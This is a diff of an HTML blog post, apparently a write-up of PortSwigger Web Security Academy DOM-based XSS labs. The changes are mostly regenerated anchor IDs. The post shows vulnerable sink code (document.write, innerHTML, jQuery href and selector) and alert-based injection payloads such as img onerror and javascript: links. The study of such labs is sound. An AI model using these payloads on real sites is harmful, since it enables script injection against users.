@@ -20,27 +20,27 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#orga5d29f0">Introduction</a></li>
-<li><a href="#org6f3514e">In <code>document.write</code>&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></li>
-<li><a href="#orgf009c42">In <code>inner.html</code>&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a>
+<li><a href="#orgd677686">Introduction</a></li>
+<li><a href="#orgfb6d51e">In <code>document.write</code>&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></li>
+<li><a href="#org71215a5">In <code>inner.html</code>&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a>
 <ul>
-<li><a href="#org4b4414f">Why did not the first payload work?</a></li>
+<li><a href="#org2d69fde">Why did not the first payload work?</a></li>
 </ul>
 </li>
-<li><a href="#org293fe43">In jQuery anchor href&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></li>
-<li><a href="#org7d598b5">In jQuery selector sink using a hashchange event&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a>
+<li><a href="#org790f217">In jQuery anchor href&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></li>
+<li><a href="#orgef263e9">In jQuery selector sink using a hashchange event&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a>
 <ul>
-<li><a href="#org24cb2f0">Update after: Intigrity explanaation video</a></li>
+<li><a href="#orga3fef43">Update after: Intigrity explanaation video</a></li>
 </ul>
 </li>
-<li><a href="#org51dae9b">Summary</a></li>
+<li><a href="#org53f3d4f">Summary</a></li>
 </ul>
 </div>
 </div>
 
-<div id="outline-container-orga5d29f0" class="outline-2">
-<h2 id="orga5d29f0"><a href="#orga5d29f0">Introduction</a></h2>
-<div class="outline-text-2" id="text-orga5d29f0">
+<div id="outline-container-orgd677686" class="outline-2">
+<h2 id="orgd677686"><a href="#orgd677686">Introduction</a></h2>
+<div class="outline-text-2" id="text-orgd677686">
 <p>
 If you have played around CTFs it is highly likely<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup> that you have
 encountered one of the common forms of cross-site scripting (XSS):
@@ -64,7 +64,7 @@ the page&rsquo;s contents based on a query.
 </p>
 
 <p>
-In the <a href="#org6f3514e">first example</a>, taken from Web Security Academy by PortSwigger,
+In the <a href="#orgfb6d51e">first example</a>, taken from Web Security Academy by PortSwigger,
 that query is a search field, but it could be a parameter, or &#x2026; a
 hashchange as shown in the last lab. Feel free to make any
 corrections/suggestions in the comment section.
@@ -72,11 +72,11 @@ corrections/suggestions in the comment section.
 </div>
 </div>
 
-<div id="outline-container-org6f3514e" class="outline-2">
-<h2 id="org6f3514e"><a href="#org6f3514e">In <code>document.write</code>&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></h2>
-<div class="outline-text-2" id="text-org6f3514e">
+<div id="outline-container-orgfb6d51e" class="outline-2">
+<h2 id="orgfb6d51e"><a href="#orgfb6d51e">In <code>document.write</code>&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></h2>
+<div class="outline-text-2" id="text-orgfb6d51e">
 <div class="org-src-container">
-<pre class="src src-js" id="org27ac9df"><span class="org-keyword">function</span> <span class="org-function-name">trackSearch</span>(<span class="org-variable-name">query</span>) {
+<pre class="src src-js" id="orgfd24002"><span class="org-keyword">function</span> <span class="org-function-name">trackSearch</span>(<span class="org-variable-name">query</span>) {
     document.write(<span class="org-string">'&lt;img src="/resources/images/tracker.gif?searchTerms='</span>+query+<span class="org-string">'"&gt;'</span>);
 }
 <span class="org-keyword">var</span> <span class="org-variable-name">query</span> = (<span class="org-keyword">new</span> <span class="org-type">URLSearchParams</span>(window.location.search)).get(<span class="org-string">'search'</span>);
@@ -86,22 +86,22 @@ corrections/suggestions in the comment section.
 </pre>
 </div>
 
-<pre class="example" id="org8c31848">
+<pre class="example" id="orgc81f15d">
 " onload="alert()
 &lt;img src="/resources/images/tracker.gif?searchTerms=" onload="alert()"&gt;
 </pre>
 </div>
 </div>
 
-<div id="outline-container-orgf009c42" class="outline-2">
-<h2 id="orgf009c42"><a href="#orgf009c42">In <code>inner.html</code>&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></h2>
-<div class="outline-text-2" id="text-orgf009c42">
+<div id="outline-container-org71215a5" class="outline-2">
+<h2 id="org71215a5"><a href="#org71215a5">In <code>inner.html</code>&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></h2>
+<div class="outline-text-2" id="text-org71215a5">
 <p>
 After navigating the site just a little bit we see that in the search
 page there is this embedded script snippet:
 </p>
 <div class="org-src-container">
-<pre class="src src-js" id="orgda183b4"><span class="org-keyword">function</span> <span class="org-function-name">doSearchQuery</span>(<span class="org-variable-name">query</span>) {
+<pre class="src src-js" id="org2223629"><span class="org-keyword">function</span> <span class="org-function-name">doSearchQuery</span>(<span class="org-variable-name">query</span>) {
     document.getElementById(<span class="org-string">'searchMessage'</span>).innerHTML = query;
 }
 <span class="org-keyword">var</span> <span class="org-variable-name">query</span> = (<span class="org-keyword">new</span> <span class="org-type">URLSearchParams</span>(window.location.search)).get(<span class="org-string">'search'</span>);
@@ -117,7 +117,7 @@ with id <code>searchMessage</code>. Seeing the response more carefully:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-html" id="org62021f0">&lt;<span class="org-function-name">h1</span>&gt;&lt;<span class="org-function-name">span</span>&gt;0 search results for
+<pre class="src src-html" id="org822ebcc">&lt;<span class="org-function-name">h1</span>&gt;&lt;<span class="org-function-name">span</span>&gt;0 search results for
 '&lt;/<span class="org-function-name">span</span>&gt;&lt;<span class="org-function-name">span</span> <span class="org-variable-name">id</span>=<span class="org-string">"searchMessage"</span>&gt;&lt;/<span class="org-function-name">span</span>&gt;&lt;<span class="org-function-name">span</span>&gt;'&lt;/<span class="org-function-name">span</span>&gt;&lt;/<span class="org-function-name">h1</span>&gt;
 </pre>
 </div>
@@ -126,7 +126,7 @@ with id <code>searchMessage</code>. Seeing the response more carefully:
 Testing this payload should be more than enough
 </p>
 <div class="org-src-container">
-<pre class="src src-html" id="org9b8c9e0">&lt;<span class="org-function-name">script</span>&gt;alert()&lt;/<span class="org-function-name">script</span>&gt;
+<pre class="src src-html" id="orgdab146c">&lt;<span class="org-function-name">script</span>&gt;alert()&lt;/<span class="org-function-name">script</span>&gt;
 </pre>
 </div>
 
@@ -137,21 +137,21 @@ a <i>solved lab</i>.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-html" id="orgf59ffb8">&lt;<span class="org-function-name">img</span> <span class="org-variable-name">src</span>=<span class="org-string">"fail"</span> <span class="org-variable-name">onerror</span>=<span class="org-string">"alert(1)"</span>&gt;
+<pre class="src src-html" id="org5005c56">&lt;<span class="org-function-name">img</span> <span class="org-variable-name">src</span>=<span class="org-string">"fail"</span> <span class="org-variable-name">onerror</span>=<span class="org-string">"alert(1)"</span>&gt;
 </pre>
 </div>
 </div>
 
-<div id="outline-container-org4b4414f" class="outline-3">
-<h3 id="org4b4414f"><a href="#org4b4414f">Why did not the first payload work?</a></h3>
+<div id="outline-container-org2d69fde" class="outline-3">
+<h3 id="org2d69fde"><a href="#org2d69fde">Why did not the first payload work?</a></h3>
 </div>
 </div>
 
-<div id="outline-container-org293fe43" class="outline-2">
-<h2 id="org293fe43"><a href="#org293fe43">In jQuery anchor href&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></h2>
-<div class="outline-text-2" id="text-org293fe43">
+<div id="outline-container-org790f217" class="outline-2">
+<h2 id="org790f217"><a href="#org790f217">In jQuery anchor href&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></h2>
+<div class="outline-text-2" id="text-org790f217">
 <div class="org-src-container">
-<pre class="src src-js" id="org7f4407e">$(<span class="org-keyword">function</span>() {
+<pre class="src src-js" id="orgc0093f5">$(<span class="org-keyword">function</span>() {
     $(<span class="org-string">'#backLink'</span>).attr(<span class="org-string">"href"</span>, (<span class="org-keyword">new</span> <span class="org-type">URLSearchParams</span>(window.location.search)).get(<span class="org-string">'returnPath'</span>));
 });
 </pre>
@@ -163,7 +163,7 @@ The thing is that the function being used <code>attr()</code> seems to do a bett
 sanitization than what we have already seen, escaping &ldquo;, and &lsquo;, not
 allowing with a plain payload to work
 </p>
-<pre class="example" id="org0efe28d">
+<pre class="example" id="orgd21d43a">
 #does not work
 testaki'&gt; &lt;script&gt;alert()&lt;/script&gt;  
 #produced result
@@ -176,7 +176,7 @@ stackoverflow post for me), reminded me of a type of link I had
 forgotten: <code>javascript:</code>
 </p>
 
-<pre class="example" id="orgf91907b">
+<pre class="example" id="org007789b">
 javascript:alert(1);
 #produced result
 &lt;a id="backLink" href="javascript:alert(1);"&gt;Back&lt;/a&gt; 
@@ -189,10 +189,10 @@ successfully marks the lab as solved.
 </div>
 </div>
 
-<div id="outline-container-org7d598b5" class="outline-2">
-<h2 id="org7d598b5"><a href="#org7d598b5">In jQuery selector sink using a hashchange event&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></h2>
-<div class="outline-text-2" id="text-org7d598b5">
-<div class="note" id="orga752805">
+<div id="outline-container-orgef263e9" class="outline-2">
+<h2 id="orgef263e9"><a href="#orgef263e9">In jQuery selector sink using a hashchange event&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></h2>
+<div class="outline-text-2" id="text-orgef263e9">
+<div class="note" id="org115b264">
 <p>
 First time on a room with a <code>Go to exploit server</code> button.
 </p>
@@ -203,7 +203,7 @@ First time on a room with a <code>Go to exploit server</code> button.
 In the website&rsquo;s home page there is this interesting js snippet:
 </p>
 <div class="org-src-container">
-<pre class="src src-js" id="orgfde119a">$(window).on(<span class="org-string">'hashchange'</span>, <span class="org-keyword">function</span>(){
+<pre class="src src-js" id="org07671cc">$(window).on(<span class="org-string">'hashchange'</span>, <span class="org-keyword">function</span>(){
     <span class="org-keyword">var</span> <span class="org-variable-name">post</span> = $(<span class="org-string">'section.blog-list h2:contains('</span> + decodeURIComponent(window.location.hash.slice(1)) + <span class="org-string">')'</span>);
     <span class="org-keyword">if</span> (post) post.get(0).scrollIntoView();
 });
@@ -238,7 +238,7 @@ the end, effectively removing <code>#</code>.</li>
 Getting back to the lab: using links of the following form allows to
 find the post with that word, and move the screen to that.
 </p>
-<pre class="example" id="org2c71469">
+<pre class="example" id="org4f228a8">
 https://0aa700fb03d82670856aa9f50084000f.web-security-academy.net/#Reverse
 https://0aa700fb03d82670856aa9f50084000f.web-security-academy.net/#Watching
 https://0aa700fb03d82670856aa9f50084000f.web-security-academy.net/#Speak
@@ -249,7 +249,7 @@ Now that we know what it does, how can we escape from it? My naive payload
 does not work, since <code>decodeURIComponent</code> obviously returns a string and
 does not just make a substitution.
 </p>
-<pre class="example" id="orgb159f97">
+<pre class="example" id="org086505d">
 # what I inserted
 /#')');alert(1); //
 # what I hoped for
@@ -277,15 +277,15 @@ page.
 </div>
 
 
-<div id="outline-container-org24cb2f0" class="outline-3">
-<h3 id="org24cb2f0"><a href="#org24cb2f0">Update after: <a href="https://www.youtube.com/watch?v=JgiX3kyK8ME">Intigrity explanaation video</a></a></h3>
+<div id="outline-container-orga3fef43" class="outline-3">
+<h3 id="orga3fef43"><a href="#orga3fef43">Update after: <a href="https://www.youtube.com/watch?v=JgiX3kyK8ME">Intigrity explanaation video</a></a></h3>
 </div>
 </div>
 
 
-<div id="outline-container-org51dae9b" class="outline-2">
-<h2 id="org51dae9b"><a href="#org51dae9b">Summary</a></h2>
-<div class="outline-text-2" id="text-org51dae9b">
+<div id="outline-container-org53f3d4f" class="outline-2">
+<h2 id="org53f3d4f"><a href="#org53f3d4f">Summary</a></h2>
+<div class="outline-text-2" id="text-org53f3d4f">
 <p>
 I think I&rsquo;m missing something so, that&rsquo;s enough labs for today, time
 for some research and theory. 
